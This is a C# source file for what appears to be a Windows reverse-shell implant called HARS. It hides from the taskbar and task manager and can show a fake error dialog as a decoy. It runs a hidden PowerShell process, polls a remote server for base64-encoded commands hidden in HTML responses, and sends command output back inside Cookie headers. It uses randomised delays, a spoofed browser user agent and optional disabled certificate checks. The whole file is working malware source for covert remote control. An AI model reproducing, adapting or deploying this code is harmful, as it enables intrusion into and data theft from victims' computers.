using HARS;
using HARS.HARS;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Windows.Forms;

namespace HARS
{
    public partial class Main : Form
    {
        // Global
        ProcessStartInfo startInfo = new ProcessStartInfo("powershell.exe");
        Process readProcess = new Process();
        string cmd = "";
        string reply = "";

        public Main()
        {
            // Init 
            InitializeComponent();
            // Check if one instance of process is already running
            if (Process.GetProcesses().Count(p => p.ProcessName == Process.GetCurrentProcess().ProcessName) > 1)
                Environment.Exit(0);
            // Set state to minimized
            this.WindowState = FormWindowState.Minimized;
            this.Opacity = 0.0;
            // Hide app from taskbar
            this.ShowInTaskbar = false;
            // Init shell process
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardInput = true;
            startInfo.RedirectStandardError = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            startInfo.StandardOutputEncoding = Encoding.GetEncoding(850);
            readProcess.StartInfo = startInfo;
            readProcess.OutputDataReceived += new DataReceivedEventHandler(IO.readProcess_OutputDataReceived);
            readProcess.ErrorDataReceived += new DataReceivedEventHandler(IO.readProcess_ErrorDataReceived);
            readProcess.Start();
            readProcess.BeginOutputReadLine();
            readProcess.BeginErrorReadLine();
        }

        // Hide app from task manager
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }

        private void Exec(string command)
        {
            string cmd = command;
            IO.stdout = "";
            IO.stderr = "";
            IO.firstline = true;
            readProcess.StandardInput.WriteLine(cmd + " ; echo FLAG_END");
        }

        private void button1_Click(object sender, EventArgs e)
        {

        }

        // Ask server for instructions
        private bool FetchCmd()
        {
            String responseString;
            try
            {
                if (Config.AllowInsecureCertificate)
                    ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(Config.Server + ":" + Config.Port + "/" + Config.Url + Utility.RandomString()));
                req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                req.Headers.Add("Accept-Encoding","gzip, deflate, br");
                req.Headers.Add("Cookie", Utility.Base64Encode("ASK"));
                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                using (Stream stream = resp.GetResponseStream())
                {
                    StreamReader reader = new StreamReader(stream, Encoding.UTF8);
                    responseString = reader.ReadToEnd();
                }
                int lastindex = responseString.LastIndexOf(">");
                if (lastindex != responseString.Length)
                {
                    cmd = responseString.Substring(lastindex + 1, responseString.Length - lastindex - 1);
                    cmd = Utility.Base64Decode(cmd);
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        // Reply to server with result
        private bool ReplyCmd()
        {
            String responseString;
            try
            {
                if (Config.AllowInsecureCertificate)
                    ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(Config.Server + ":" + Config.Port + "/" + Config.Url + Utility.RandomString()));
                req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                req.Headers.Add("Accept-Encoding", "gzip, deflate, br");
                req.Headers.Add("Cookie", Utility.Base64Encode(reply));
                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                using (Stream stream = resp.GetResponseStream())
                {
                    StreamReader reader = new StreamReader(stream, Encoding.UTF8);
                    responseString = reader.ReadToEnd();
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        // First connection to server
        private bool Init()
        {
            String responseString;
            try
            {
                if (Config.AllowInsecureCertificate)
                    ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(Config.Server + ":" + Config.Port + "/" + Config.Url + Utility.RandomString()));
                req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                req.Headers.Add("Accept-Encoding", "gzip, deflate, br");
                req.Headers.Add("Cookie", Utility.Base64Encode("HELLO"));
                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                using (Stream stream = resp.GetResponseStream())
                {
                    StreamReader reader = new StreamReader(stream, Encoding.UTF8);
                    responseString = reader.ReadToEnd();
                }
                if (responseString.Contains(Utility.Base64Encode("HELLO")))
                    return true;
                return false;
            }
            catch
            {
                return false;
            }
        }

        private void Main_Load(object sender, EventArgs e)
        {
            // Show fake error message
            if (Config.DisplayErrorMsg)
            {
                var thread = new Thread(
                    () =>
                    {
                        MessageBox.Show(Config.ErrorMsgDesc, Config.ErrorMsgTitle, MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
                    });
                thread.Start();
            }
            // Initialise connection to server
            if (!Init())
            {
                // Exit if server dont reply "hello"
                Environment.Exit(0);
            }
            // Acting forever..
            while (true)
            {
                try
                {
                    // Random delay between fetchs
                    Random rnd = new Random();
                    int delay = rnd.Next(Config.MinDelay, Config.MaxDelay);
                    Thread.Sleep(TimeSpan.FromSeconds(delay));
                    // Request server if cmd empty
                    if (cmd == "")
                    {
                        FetchCmd();
                    }
                    // Or reply to server with cmd result
                    else
                    {
                        if (cmd == "exit")
                        {
                            reply = "EXIT OK";
                            ReplyCmd();
                            readProcess.StandardInput.WriteLine("exit");
                            readProcess.WaitForExit();
                            Environment.Exit(0);
                        }
                        Exec(cmd);
                        while (!IO.stderr.Contains("FLAG_END") && !IO.stdout.Contains("FLAG_END"))
                        {
                            Thread.Sleep(100);
                        }
                        if (IO.stderr.Length > 2)
                        {
                            reply = IO.stderr;
                        }
                        else
                        {
                            try
                            {
                                IO.stdout = IO.stdout.Remove(IO.stdout.TrimEnd().LastIndexOf(Environment.NewLine));
                            }
                            catch
                            {
                                // Nothing
                            }
                            reply = IO.stdout;
                        }
                        reply = reply.Replace("FLAG_END", "");
                        ReplyCmd();
                        IO.stdout = "";
                        IO.stderr = "";
                        cmd = "";
                        reply = "";
                    }
                }
                // Exit if error
                catch
                {
                    Environment.Exit(0);
                }
            }
        }

        private void Main_Click(object sender, EventArgs e)
        {

        }

        private void Button1_Click_1(object sender, EventArgs e)
        {

        }
    }
}
